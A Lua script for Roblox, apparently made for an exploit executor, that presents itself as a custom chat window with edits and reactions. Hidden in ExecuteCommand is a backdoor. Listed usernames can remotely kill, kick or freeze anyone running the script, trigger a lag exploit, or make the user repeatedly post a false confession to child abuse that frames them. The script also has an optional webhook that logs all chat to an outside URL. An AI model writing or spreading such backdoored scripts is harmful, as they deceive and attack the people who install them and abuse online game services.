local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")

local RS = ReplicatedStorage:WaitForChild("GrabEvents")
local ExtendGrabLine = RS:WaitForChild("ExtendGrabLine")
local OnReceiveMessage = RS:FindFirstChild("OnReceiveMessage")
local NetworkClient = RS:FindFirstChild("NetworkClient")

local Prefix = "!"

local HeadAdmins = {
    "ZxcQuiltikk"
}

local Admins = {
    "Vladblak456",
    "skylinejx8207"
}

local AdminAllowedCommands = {
    "say", "bring", "reveal",
}


local function isHeadAdmin(username)
    return table.find(HeadAdmins, username) ~= nil
end

local function isAdmin(username)
    return isHeadAdmin(username) or table.find(Admins, username) ~= nil
end

local function canUseCommand(senderUsername, commandName)
    if isHeadAdmin(senderUsername) then
        return true
    end
    
    if isAdmin(senderUsername) then
        return table.find(AdminAllowedCommands, commandName) ~= nil
    end

    return false
end

local MAX_MESSAGES = 20
local chatHistory = {}
local webhookEnabled = false
local webhookUrl = ""
local editingLabel = nil
local editingOriginalText = nil
local reactionMenuOpen = nil
local activeNotifications = {}
local messageReactions = {}
local messageOrder = 0

local REACTIONS = {"✔", "❌", "🥶", "😲", "🤬"}
local IMAGE_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}

local function ExecuteCommand(Args, Admin)
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local Root = Humanoid and Character:FindFirstChild("HumanoidRootPart")
    local cmdWord1 = string.lower(Args[1] or "")

    if not Character or not Humanoid then return end

    if cmdWord1 == Prefix.."kill" then
        Humanoid.Health = 0
    elseif cmdWord1 == Prefix.."bring" then
        local AdminCharacter = Admin.Character or Admin.CharacterAdded:Wait()
        local AdminRoot = AdminCharacter and AdminCharacter:FindFirstChild("HumanoidRootPart")
        if AdminRoot then
            Root.CFrame = AdminRoot.CFrame * CFrame.new(0, 0, -5)
        end
    elseif cmdWord1 == Prefix.."kick" then
        local reason = table.concat(Args, " ", 3)
        if reason and reason ~= "" then
            LocalPlayer:Kick(string.format("Kicked by admin (%s): %s", Admin.DisplayName, reason))
        else
            LocalPlayer:Kick(string.format("Kicked by admin (%s)", Admin.DisplayName))
        end
    elseif cmdWord1 == Prefix.."reveal" then
        ExtendGrabLine:FireServer("im Use Chat //chat")
    elseif cmdWord1 == Prefix.."report" then
        spawn(function()
            while true do
                ExtendGrabLine:FireServer("i touch kidssssss //chat")
                task.wait(1)
            end
        end)
    elseif cmdWord1 == Prefix.."lag" then
        local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
        if fireAllRemotes then fireAllRemotes.Enabled = true end
    elseif cmdWord1 == Prefix.."unlag" then
        local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
        if fireAllRemotes then fireAllRemotes.Enabled = false end
    elseif cmdWord1 == Prefix.."crash" then
        task.wait(5)
        while true do end
    elseif cmdWord1 == Prefix.."remove" and string.lower(Args[2] or "") == "gucci" then
        local targetName = Args[3]
        if not targetName then return end

        local targetPlayer = nil
        for _, player in pairs(Players:GetPlayers()) do
            if string.lower(player.Name) == string.lower(targetName) then
                targetPlayer = player
                break
            end
        end

        if targetPlayer and targetPlayer == LocalPlayer and targetPlayer.Character then
            local character = targetPlayer.Character
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Sit = true
                task.wait(0.1)
                humanoid.Jump = true
            end
        end
    elseif cmdWord1 == Prefix.."say" then
        local message = table.concat(Args, " ", 2)
        if message and message ~= "" then
            ExtendGrabLine:FireServer(message .. " //chat")
        end
    end
end

local function IsImageUrl(text)
    local url = text:match("https?://[%S]+")
    if not url then return false end
    local clean = url:gsub("%?.*$", "")
    for _, ext in ipairs(IMAGE_EXTENSIONS) do
        if clean:lower():match("%." .. ext .. "$") then
            return true
        end
    end
    return false
end

local function ExtractImageUrl(text)
    return text:match("https?://[%S]+")
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CustomChatGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "ChatFrame"
MainFrame.Size = UDim2.new(0, 269, 0, 346)
MainFrame.Position = UDim2.new(0.1, 0, 0.2, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = MainFrame

local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 27)
TopBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopBarCorner = Instance.new("UICorner")
TopBarCorner.CornerRadius = UDim.new(0, 6)
TopBarCorner.Parent = TopBar

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, -62, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Chat"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 12
Title.Font = Enum.Font.GothamSemibold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TopBar

local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 27, 0, 27)
CloseButton.Position = UDim2.new(1, -27, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 18
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = TopBar

local MessagesScroll = Instance.new("ScrollingFrame")
MessagesScroll.Name = "Messages"
MessagesScroll.Size = UDim2.new(1, -16, 1, -77)
MessagesScroll.Position = UDim2.new(0, 8, 0, 35)
MessagesScroll.BackgroundTransparency = 1
MessagesScroll.BorderSizePixel = 0
MessagesScroll.ScrollBarThickness = 3
MessagesScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
MessagesScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
MessagesScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
MessagesScroll.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 5)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Parent = MessagesScroll

local UIPaddingScroll = Instance.new("UIPadding")
UIPaddingScroll.PaddingTop = UDim.new(0, 4)
UIPaddingScroll.PaddingBottom = UDim.new(0, 8)
UIPaddingScroll.Parent = MessagesScroll

local EditBar = Instance.new("Frame")
EditBar.Name = "EditBar"
EditBar.Size = UDim2.new(1, -16, 0, 20)
EditBar.Position = UDim2.new(0, 8, 1, -60)
EditBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
EditBar.BorderSizePixel = 0
EditBar.Visible = false
EditBar.Parent = MainFrame

local EditBarCorner = Instance.new("UICorner")
EditBarCorner.CornerRadius = UDim.new(0, 4)
EditBarCorner.Parent = EditBar

local EditBarLabel = Instance.new("TextLabel")
EditBarLabel.Size = UDim2.new(1, -30, 1, 0)
EditBarLabel.Position = UDim2.new(0, 8, 0, 0)
EditBarLabel.BackgroundTransparency = 1
EditBarLabel.Text = "✏️ Editing message..."
EditBarLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
EditBarLabel.TextSize = 10
EditBarLabel.Font = Enum.Font.Gotham
EditBarLabel.TextXAlignment = Enum.TextXAlignment.Left
EditBarLabel.TextTruncate = Enum.TextTruncate.AtEnd
EditBarLabel.Parent = EditBar

local EditCancelButton = Instance.new("TextButton")
EditCancelButton.Size = UDim2.new(0, 20, 0, 20)
EditCancelButton.Position = UDim2.new(1, -20, 0, 0)
EditCancelButton.BackgroundTransparency = 1
EditCancelButton.Text = "×"
EditCancelButton.TextColor3 = Color3.fromRGB(255, 100, 100)
EditCancelButton.TextSize = 14
EditCancelButton.Font = Enum.Font.GothamBold
EditCancelButton.Parent = EditBar

local InputFrame = Instance.new("Frame")
InputFrame.Name = "InputFrame"
InputFrame.Size = UDim2.new(1, -16, 0, 31)
InputFrame.Position = UDim2.new(0, 8, 1, -38)
InputFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
InputFrame.BorderSizePixel = 0
InputFrame.Parent = MainFrame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 5)
InputCorner.Parent = InputFrame

local InputBox = Instance.new("TextBox")
InputBox.Name = "InputBox"
InputBox.Size = UDim2.new(1, -62, 1, -8)
InputBox.Position = UDim2.new(0, 8, 0, 4)
InputBox.BackgroundTransparency = 1
InputBox.Text = ""
InputBox.PlaceholderText = "Type a message..."
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
InputBox.TextSize = 11
InputBox.Font = Enum.Font.Gotham
InputBox.ClearTextOnFocus = false
InputBox.Parent = InputFrame

local SendButton = Instance.new("TextButton")
SendButton.Name = "SendButton"
SendButton.Size = UDim2.new(0, 46, 0, 23)
SendButton.Position = UDim2.new(1, -54, 0, 4)
SendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
SendButton.Text = "Send"
SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SendButton.TextSize = 11
SendButton.Font = Enum.Font.GothamSemibold
SendButton.Parent = InputFrame

local SendCorner = Instance.new("UICorner")
SendCorner.CornerRadius = UDim.new(0, 5)
SendCorner.Parent = SendButton

local ToggleButton = Instance.new("TextButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Size = UDim2.new(0, 38, 0, 38)
ToggleButton.Position = UDim2.new(0, 15, 0.9, -19)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
ToggleButton.Text = "💬"
ToggleButton.TextSize = 18
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.Parent = ScreenGui
ToggleButton.ZIndex = 10

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(1, 0)
ToggleCorner.Parent = ToggleButton

local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Thickness = 2
ToggleStroke.Color = Color3.fromRGB(255, 255, 255)
ToggleStroke.Parent = ToggleButton

local NotifFrame = Instance.new("Frame")
NotifFrame.Name = "NotificationTemplate"
NotifFrame.Size = UDim2.new(0, 250, 0, 0)
NotifFrame.AutomaticSize = Enum.AutomaticSize.Y
NotifFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
NotifFrame.BorderSizePixel = 0
NotifFrame.Visible = false
NotifFrame.ZIndex = 100

local NotifCorner = Instance.new("UICorner")
NotifCorner.CornerRadius = UDim.new(0, 8)
NotifCorner.Parent = NotifFrame

local NotifTitle = Instance.new("TextLabel")
NotifTitle.Name = "Title"
NotifTitle.Size = UDim2.new(1, -20, 0, 20)
NotifTitle.Position = UDim2.new(0, 10, 0, 8)
NotifTitle.BackgroundTransparency = 1
NotifTitle.Text = "Chat"
NotifTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
NotifTitle.TextSize = 14
NotifTitle.Font = Enum.Font.GothamBold
NotifTitle.TextXAlignment = Enum.TextXAlignment.Left
NotifTitle.Parent = NotifFrame

local NotifContent = Instance.new("TextLabel")
NotifContent.Name = "Content"
NotifContent.Size = UDim2.new(1, -20, 0, 0)
NotifContent.AutomaticSize = Enum.AutomaticSize.Y
NotifContent.Position = UDim2.new(0, 10, 0, 28)
NotifContent.BackgroundTransparency = 1
NotifContent.Text = ""
NotifContent.TextColor3 = Color3.fromRGB(255, 255, 255)
NotifContent.TextSize = 13
NotifContent.Font = Enum.Font.Gotham
NotifContent.TextXAlignment = Enum.TextXAlignment.Left
NotifContent.TextWrapped = true
NotifContent.Parent = NotifFrame

local NotifPadding = Instance.new("UIPadding")
NotifPadding.PaddingBottom = UDim.new(0, 10)
NotifPadding.Parent = NotifFrame

local function MakeDraggable(frame, dragHandle)
    local dragging = false
    local dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

MakeDraggable(MainFrame, TopBar)
MakeDraggable(ToggleButton, ToggleButton)

local function CancelEdit()
    editingLabel = nil
    editingOriginalText = nil
    EditBar.Visible = false
    InputBox.PlaceholderText = "Type a message..."
    InputBox.Text = ""
    SendButton.Text = "Send"
    SendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
end

local function StartEdit(label, messageText)
    editingLabel = label
    editingOriginalText = messageText
    EditBar.Visible = true
    EditBarLabel.Text = '✏️ Editing: "' .. messageText .. '"'
    InputBox.Text = messageText:match("^.+:%s*(.+)$") or messageText
    InputBox:CaptureFocus()
    SendButton.Text = "Edit"
    SendButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
end

local function MarkAsEdited(label)
    if label:FindFirstChild("EditIcon") then return end
    local editIcon = Instance.new("TextLabel")
    editIcon.Name = "EditIcon"
    editIcon.Size = UDim2.new(0, 14, 0, 14)
    editIcon.Position = UDim2.new(1, 10, 1, 5.5)
    editIcon.AnchorPoint = Vector2.new(1, 1)
    editIcon.BackgroundTransparency = 1
    editIcon.Text = "✏️"
    editIcon.TextSize = 8
    editIcon.Font = Enum.Font.Gotham
    editIcon.Parent = label
end

local function GetMsgId(label)
    return label:GetAttribute("OriginalText") or label.Text
end

local function FindLabelByText(text)
    for _, child in ipairs(MessagesScroll:GetChildren()) do
        if child:IsA("TextButton") and child:GetAttribute("OriginalText") == text then
            return child
        end
    end
    for _, child in ipairs(MessagesScroll:GetChildren()) do
        if child:IsA("TextButton") and child.Text == text then
            return child
        end
    end
    return nil
end

local function CloseReactionMenu()
    if reactionMenuOpen then
        reactionMenuOpen:Destroy()
        reactionMenuOpen = nil
    end
end

local function UpdateReactionBar(label)
    local msgId = GetMsgId(label)
    local barName = "ReactionBar_" .. msgId

    for _, child in ipairs(MessagesScroll:GetChildren()) do
        if child.Name == barName then
            child:Destroy()
        end
    end

    if not messageReactions[msgId] then 
        task.wait()
        MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
        return 
    end

    local hasAny = false
    for _, users in pairs(messageReactions[msgId]) do
        for _ in pairs(users) do
            hasAny = true
            break
        end
        if hasAny then break end
    end
    
    if not hasAny then 
        task.wait()
        MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
        return 
    end

    local bar = Instance.new("Frame")
    bar.Name = barName
    bar.Size = UDim2.new(0, 0, 0, 22)
    bar.AutomaticSize = Enum.AutomaticSize.X
    bar.BackgroundTransparency = 1
    bar.LayoutOrder = label.LayoutOrder + 1
    bar.Parent = MessagesScroll

    local barLayout = Instance.new("UIListLayout")
    barLayout.FillDirection = Enum.FillDirection.Horizontal
    barLayout.Padding = UDim.new(0, 4)
    barLayout.SortOrder = Enum.SortOrder.LayoutOrder
    barLayout.Parent = bar

    local order = 1
    for emoji, users in pairs(messageReactions[msgId]) do
        local count = 0
        local iReacted = false
        for user, _ in pairs(users) do
            count = count + 1
            if user == LocalPlayer.DisplayName then
                iReacted = true
            end
        end

        if count > 0 then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(0, count > 1 and 40 or 28, 0, 20)
            btn.BackgroundColor3 = iReacted and Color3.fromRGB(45, 60, 90) or Color3.fromRGB(60, 60, 70)
            btn.Text = count > 1 and (emoji .. " " .. count) or emoji
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.TextSize = 11
            btn.Font = Enum.Font.GothamSemibold
            btn.AutoButtonColor = false
            btn.LayoutOrder = order
            btn.Parent = bar

            local btnCorner = Instance.new("UICorner")
            btnCorner.CornerRadius = UDim.new(0, 4)
            btnCorner.Parent = btn

            if iReacted then
                local btnStroke = Instance.new("UIStroke")
                btnStroke.Thickness = 1
                btnStroke.Color = Color3.fromRGB(80, 120, 200)
                btnStroke.Parent = btn
            end

            btn.MouseButton1Click:Connect(function()
                ExtendGrabLine:FireServer(msgId .. "||REACT||" .. emoji .. "||" .. LocalPlayer.DisplayName .. " //react")
            end)

            order = order + 1
        end
    end

    task.wait()
    MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
end

local function ShowReactionMenu(label)
    CloseReactionMenu()

    local msgId = GetMsgId(label)

    local menuWidth = #REACTIONS * 34 + 12
    local menu = Instance.new("Frame")
    menu.Name = "ReactionMenu"
    menu.Size = UDim2.new(0, menuWidth, 0, 34)
    menu.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    menu.BorderSizePixel = 0
    menu.ZIndex = 50
    menu.Parent = ScreenGui

    local labelAbsPos = label.AbsolutePosition
    local labelAbsSize = label.AbsoluteSize
    menu.Position = UDim2.new(0, labelAbsPos.X + labelAbsSize.X - menuWidth, 0, labelAbsPos.Y - 38)

    local menuCorner = Instance.new("UICorner")
    menuCorner.CornerRadius = UDim.new(1, 0)
    menuCorner.Parent = menu

    local menuStroke = Instance.new("UIStroke")
    menuStroke.Thickness = 1
    menuStroke.Color = Color3.fromRGB(70, 70, 70)
    menuStroke.Parent = menu

    local menuLayout = Instance.new("UIListLayout")
    menuLayout.FillDirection = Enum.FillDirection.Horizontal
    menuLayout.Padding = UDim.new(0, 0)
    menuLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    menuLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    menuLayout.Parent = menu

    for i, emoji in ipairs(REACTIONS) do
        local alreadyReacted = messageReactions[msgId] and messageReactions[msgId][emoji] and messageReactions[msgId][emoji][LocalPlayer.DisplayName]

        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 34, 0, 34)
        btn.BackgroundTransparency = alreadyReacted and 0.7 or 1
        btn.BackgroundColor3 = Color3.fromRGB(0, 80, 180)
        btn.Text = emoji
        btn.TextSize = 18
        btn.Font = Enum.Font.Gotham
        btn.AutoButtonColor = false
        btn.LayoutOrder = i
        btn.ZIndex = 51
        btn.Parent = menu

        if alreadyReacted then
            local bCorner = Instance.new("UICorner")
            bCorner.CornerRadius = UDim.new(1, 0)
            bCorner.Parent = btn
        end

        btn.MouseButton1Click:Connect(function()
            ExtendGrabLine:FireServer(msgId .. "||REACT||" .. emoji .. "||" .. LocalPlayer.DisplayName .. " //react")
            CloseReactionMenu()
        end)

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.15), {TextSize = 22}):Play()
        end)

        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.15), {TextSize = 18}):Play()
        end)
    end

    menu.BackgroundTransparency = 1
    menuStroke.Transparency = 1
    TweenService:Create(menu, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0
    }):Play()
    TweenService:Create(menuStroke, TweenInfo.new(0.2), {Transparency = 0}):Play()

    reactionMenuOpen = menu

    task.delay(4, function()
        if reactionMenuOpen == menu then
            CloseReactionMenu()
        end
    end)
end

local function CreateMessageLabel(text, senderName)
    local msgContent = text:match("^.+:%s*(.+)$") or text
    local isImage = IsImageUrl(msgContent)
    local isMine = senderName == LocalPlayer.DisplayName

    local label = Instance.new("TextButton")
    label.Size = UDim2.new(1, -8, 0, 0)
    label.AutomaticSize = Enum.AutomaticSize.Y
    label.BackgroundColor3 = isImage and Color3.fromRGB(45, 50, 60) or Color3.fromRGB(50, 50, 50)
    label.Text = isImage and (text:match("^(.+:)") or senderName) .. " 🖼️ [Image]" or text
    label.TextColor3 = isImage and Color3.fromRGB(120, 180, 255) or Color3.fromRGB(255, 255, 255)
    label.TextSize = 11
    label.Font = Enum.Font.Gotham
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextWrapped = true
    label.AutoButtonColor = false
    label:SetAttribute("OriginalText", text)
    label:SetAttribute("SenderName", senderName)
    label.ClipsDescendants = true

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = label

    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 6)
    padding.PaddingBottom = UDim.new(0, 6)
    padding.PaddingLeft = UDim.new(0, 8)
    padding.PaddingRight = UDim.new(0, 8)
    padding.Parent = label

    label.MouseButton2Click:Connect(function()
        if reactionMenuOpen then
            CloseReactionMenu()
        else
            ShowReactionMenu(label)
        end
    end)

    if isMine and not isImage then
        label.MouseButton1Down:Connect(function()
            local start = tick()
            task.wait(0.5)
            if tick() - start >= 0.5 then
                StartEdit(label, label.Text)
            end
        end)
    end

    return label
end

local function AddMessage(text, senderName)
    table.insert(chatHistory, text)
    if #chatHistory > MAX_MESSAGES then
        table.remove(chatHistory, 1)
    end
    messageOrder = messageOrder + 2
    local label = CreateMessageLabel(text, senderName or "Unknown")
    label.LayoutOrder = messageOrder
    label.Parent = MessagesScroll
    task.wait()
    MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
    return label
end

local function RepositionNotifications()
    local offset = 0
    for i = #activeNotifications, 1, -1 do
        local n = activeNotifications[i]
        if not n or not n.Parent then
            table.remove(activeNotifications, i)
        end
    end
    for i = #activeNotifications, 1, -1 do
        local n = activeNotifications[i]
        local targetY = 0.8 - (offset * 0.1)
        TweenService:Create(n, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
            Position = UDim2.new(1, -270, targetY, 0)
        }):Play()
        offset = offset + 1
    end
end

local function ShowNotification(title, content)
    local notif = NotifFrame:Clone()
    notif.Name = "ActiveNotification"
    notif.Title.Text = title
    notif.Content.Text = content
    notif.Position = UDim2.new(1, 20, 0.8, 0)
    notif.Visible = true
    notif.Parent = ScreenGui

    table.insert(activeNotifications, notif)

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://9120381235"
    sound.Volume = 0.5
    sound.Parent = SoundService
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 2)

    TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {
        Position = UDim2.new(1, -270, 0.8, 0)
    }):Play()

    task.wait(0.5)
    RepositionNotifications()

    task.delay(5, function()
        local tween = TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {
            Position = UDim2.new(1, 20, notif.Position.Y.Scale, 0)
        })
        tween:Play()
        tween.Completed:Wait()

        for i, n in ipairs(activeNotifications) do
            if n == notif then
                table.remove(activeNotifications, i)
                break
            end
        end

        notif:Destroy()
        RepositionNotifications()
    end)
end

local function SendMessage()
    local text = InputBox.Text
    if not text or not text:match("%S") then return end

    if editingLabel and editingOriginalText then
        local newMsg = LocalPlayer.DisplayName .. ": " .. text
        if newMsg == editingOriginalText then
            CancelEdit()
            return
        end
        ExtendGrabLine:FireServer(editingOriginalText .. "||EDITED||" .. newMsg .. " //edit")
        CancelEdit()
    else
        ExtendGrabLine:FireServer(text .. " //chat")
    end

    InputBox.Text = ""
end

local function HandleEdit(oldText, newText, senderName)
    if oldText == newText then return end
    local label = FindLabelByText(oldText)
    if label then
        label.Text = newText
        label:SetAttribute("OriginalText", newText)
        MarkAsEdited(label)
    end
    for i, msg in ipairs(chatHistory) do
        if msg == oldText then
            chatHistory[i] = newText
            break
        end
    end
    ShowNotification("Message Edited", senderName .. " edited a message")
end

local function HandleReaction(msgId, emoji, reactorName)
    if not messageReactions[msgId] then
        messageReactions[msgId] = {}
    end
    if not messageReactions[msgId][emoji] then
        messageReactions[msgId][emoji] = {}
    end

    if messageReactions[msgId][emoji][reactorName] then
        messageReactions[msgId][emoji][reactorName] = nil
        local count = 0
        for _ in pairs(messageReactions[msgId][emoji]) do count = count + 1 end
        if count == 0 then
            messageReactions[msgId][emoji] = nil
        end
    else
        messageReactions[msgId][emoji][reactorName] = true
    end

    local label = FindLabelByText(msgId)
    if label then
        UpdateReactionBar(label)
    end

    if reactorName ~= LocalPlayer.DisplayName then
        if messageReactions[msgId] and messageReactions[msgId][emoji] and messageReactions[msgId][emoji][reactorName] then
            ShowNotification("Reaction", reactorName .. " reacted " .. emoji)
        else
            ShowNotification("Reaction", reactorName .. " removed " .. emoji)
        end
    end
end

local function HandleIncomingMessage(message, sender)
    if typeof(message) ~= "string" or message == "" then return end

    local senderName = "Unknown"
    if typeof(sender) == "Instance" and sender:IsA("Player") then
        senderName = sender.DisplayName
    elseif typeof(sender) == "string" then
        senderName = sender
    end

    if message:find(" //react") then
        local cleanMessage = message:gsub(" //react$", "")
        local msgText, emoji, reactorName = cleanMessage:match("^(.+)||REACT||(.+)||(.+)$")
        if msgText and emoji and reactorName then
            HandleReaction(msgText, emoji, reactorName)
        end
        return
    end

    if message:find(" //edit") then
        local cleanMessage = message:gsub(" //edit$", "")
        local oldText, newText = cleanMessage:match("^(.+)||EDITED||(.+)$")
        if oldText and newText then
            HandleEdit(oldText, newText, senderName)
        end
        return
    end

    local cleanMessage = message:gsub(" //chat$", "")
    local logEntry = senderName .. ": " .. cleanMessage
    AddMessage(logEntry, senderName)

    if IsImageUrl(cleanMessage) then
        ShowNotification("New Image", senderName .. " sent an image")
    else
        ShowNotification("New Message", logEntry)
    end

    if webhookEnabled and webhookUrl ~= "" then
        pcall(function()
            request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content = string.format("**%s**: %s", senderName, cleanMessage),
                    username = "Chat Logger"
                })
            })
        end)
    end
end

local function ProcessEvent(...)
    local args = {...}
    local sender = nil
    local message = nil

    if #args >= 2 and typeof(args[1]) == "Instance" and args[1]:IsA("Player") and typeof(args[2]) == "string" then
        sender = args[1]
        message = args[2]
    elseif #args >= 1 and typeof(args[1]) == "string" then
        message = args[1]
        sender = LocalPlayer
    end

    if sender and message then
        local senderName = sender.Name
        local cleanMsg = message

        if cleanMsg:sub(-7) == " //chat" then
            cleanMsg = cleanMsg:sub(1, -8)
        end

        if isAdmin(senderName) and string.sub(cleanMsg, 1, #Prefix) == Prefix then
            local Args = cleanMsg:split(" ")
            local cmdWord1 = string.lower(Args[1] or "")
            local commandName = cmdWord1:sub(#Prefix + 1)

            if canUseCommand(senderName, commandName) then
                local targetName = string.lower(Args[2] or "")

                if string.lower(LocalPlayer.Name) ~= targetName and sender ~= LocalPlayer then
                    ExecuteCommand(Args, sender)
                end
            end
        end
    end

    if message and typeof(message) == "string" and 
       (message:find(" //chat") or message:find(" //edit") or message:find(" //react")) then
        HandleIncomingMessage(message, sender)
    end
end

SendButton.MouseButton1Click:Connect(SendMessage)
InputBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        SendMessage()
    end
end)

EditCancelButton.MouseButton1Click:Connect(CancelEdit)

local periodPressed = false

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Period and not InputBox:IsFocused() then
        periodPressed = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Period and periodPressed then
        periodPressed = false
        InputBox.Text = ""
        InputBox:CaptureFocus()
        task.defer(function()
            InputBox.Text = ""
        end)
    end
end)

local savedPos = nil

CloseButton.MouseButton1Click:Connect(function()
    savedPos = MainFrame.Position
    MainFrame.Visible = false
    ToggleButton.Visible = true
end)

ToggleButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
    if MainFrame.Visible then
        if savedPos then
            MainFrame.Position = savedPos
        end
        ToggleButton.Visible = false
    end
end)

if OnReceiveMessage then
    OnReceiveMessage.OnClientEvent:Connect(ProcessEvent)
end

if NetworkClient then
    NetworkClient.OnClientEvent:Connect(ProcessEvent)
end

ExtendGrabLine.OnClientEvent:Connect(ProcessEvent)

local ChatEvent = ReplicatedStorage:FindFirstChild("ChatEvent")
if ChatEvent then
    ChatEvent.OnClientEvent:Connect(ProcessEvent)
end

ToggleButton.Visible = false 
